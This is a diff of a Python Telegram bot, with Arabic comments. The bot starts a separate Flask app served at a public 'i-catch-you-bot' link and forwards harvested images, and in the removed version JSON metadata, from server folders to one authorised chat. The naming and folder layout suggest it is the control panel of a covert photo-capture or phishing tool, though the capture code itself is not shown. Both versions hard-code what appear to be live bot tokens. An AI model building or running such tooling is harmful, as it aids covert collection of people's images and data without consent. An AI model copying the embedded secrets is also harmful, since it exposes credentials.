@@ -1,122 +1,55 @@
-import os
-import subprocess
-import time
+import os, subprocess, time, threading
 from telegram.ext import ApplicationBuilder, CommandHandler
+from flask import Flask
 
-# =========================
-# CONFIG
-# =========================
-BOT_TOKEN = "8612074749:AAHGvzF43cf5AkwzGhEDJHgvwNRF2KaO2qg"
+# 1. السيرفر الوهمي لإرضاء Render ومنع خطأ No open ports
+app_web = Flask(__name__)
+@app_web.route('/')
+def home(): return "Bot is running"
+def run_web(): app_web.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
+threading.Thread(target=run_web, daemon=True).start()
+
+# 2. إعدادات البوت
+BOT_TOKEN = "8612074749:AAGLniCsu_LAn3rUos4aZaqs5mRlz0QxCgE"
 AUTHORIZED_CHAT_ID = 5087545397
-
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 flask_process = None
 
-# مسارات المجلدات
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-images_folder = os.path.join(BASE_DIR, "images")
-sent_folder = os.path.join(BASE_DIR, "sent")
-metadata_folder = os.path.join(BASE_DIR, "metadata")
-sent_info_folder = os.path.join(BASE_DIR, "infos_sent")
-
-# إنشاء المجلدات
-os.makedirs(images_folder, exist_ok=True)
-os.makedirs(sent_folder, exist_ok=True)
-os.makedirs(metadata_folder, exist_ok=True)
-os.makedirs(sent_info_folder, exist_ok=True)
-
-def is_file_ready(filepath):
-    try:
-        if not os.path.exists(filepath):
-            return False
-        initial_size = os.path.getsize(filepath)
-        time.sleep(0.3)
-        return initial_size == os.path.getsize(filepath) and initial_size > 0
-    except:
-        return False
-
-# =========================
-# FUNCTIONS
-# =========================
-async def start(update, context):
+# 3. الدوال
+async def start(u, c):
     global flask_process
-    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
-        return
+    if u.effective_chat.id != AUTHORIZED_CHAT_ID: return
     if flask_process is None:
-        # تشغيل app.py كعملية منفصلة
         flask_process = subprocess.Popen(["python", "app.py"], cwd=BASE_DIR)
-        await update.message.reply_text("✅ Server (Flask) Started!")
+        await u.message.reply_text("✅ Server Started!\n🌍 Link: https://i-catch-you-bot.onrender.com/")
     else:
-        await update.message.reply_text("⚠️ Server already running")
+        await u.message.reply_text("⚠️ Server already running")
 
-async def stop(update, context):
+async def stop(u, c):
     global flask_process
-    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
-        return
+    if u.effective_chat.id != AUTHORIZED_CHAT_ID: return
     if flask_process:
         flask_process.kill()
         flask_process = None
-        await update.message.reply_text("🛑 Server stopped")
-    else:
-        await update.message.reply_text("⚠️ Server not running")
+        await u.message.reply_text("🛑 Server stopped")
 
-async def status(update, context):
-    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
+async def images(u, c):
+    if u.effective_chat.id != AUTHORIZED_CHAT_ID: return
+    img_dir = os.path.join(BASE_DIR, "images")
+    files = [f for f in os.listdir(img_dir) if f.lower().endswith((".jpg", ".png", ".jpeg"))]
+    if not files:
+        await u.message.reply_text("⚠️ No images")
         return
-    if flask_process and flask_process.poll() is None:
-        await update.message.reply_text("🟢 Server online")
-    else:
-        await update.message.reply_text("🔴 Server offline")
+    for f in files:
+        with open(os.path.join(img_dir, f), "rb") as img:
+            await u.message.reply_photo(photo=img)
+        os.replace(os.path.join(img_dir, f), os.path.join(BASE_DIR, "sent", f))
 
-async def images(update, context):
-    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
-        return
-    try:
-        all_files = os.listdir(images_folder)
-        files = [f for f in all_files if f.lower().endswith((".png", ".jpg", ".jpeg", ".webp"))]
-        files.sort()
-        if not files:
-            await update.message.reply_text("⚠️ No new images")
-            return
-        await update.message.reply_text(f"📸 Sending {len(files)} images...")
-        for file in files:
-            image_path = os.path.join(images_folder, file)
-            target_path = os.path.join(sent_folder, file)
-            if not is_file_ready(image_path):
-                continue
-            with open(image_path, "rb") as img:
-                await update.message.reply_photo(photo=img)
-            os.replace(image_path, target_path)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
-
-async def infos(update, context):
-    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
-        return
-    try:
-        all_files = os.listdir(metadata_folder)
-        files = [f for f in all_files if f.lower().endswith(".json")]
-        files.sort()
-        if not files:
-            await update.message.reply_text("📭 No new metadata")
-            return
-        latest_file = files[-1]
-        metadata_path = os.path.join(metadata_folder, latest_file)
-        with open(metadata_path, "r", encoding="utf-8") as f:
-            data = f.read()
-        await update.message.reply_text(f"📄 Info:\n\n{data}")
-        os.replace(metadata_path, os.path.join(sent_info_folder, latest_file))
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
-
-# =========================
-# BOT INIT
-# =========================
+# 4. تشغيل البوت
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CommandHandler("stop", stop))
-app.add_handler(CommandHandler("status", status))
 app.add_handler(CommandHandler("images", images))
-app.add_handler(CommandHandler("infos", infos))
 
 print("🤖 Bot running...")
 app.run_polling()
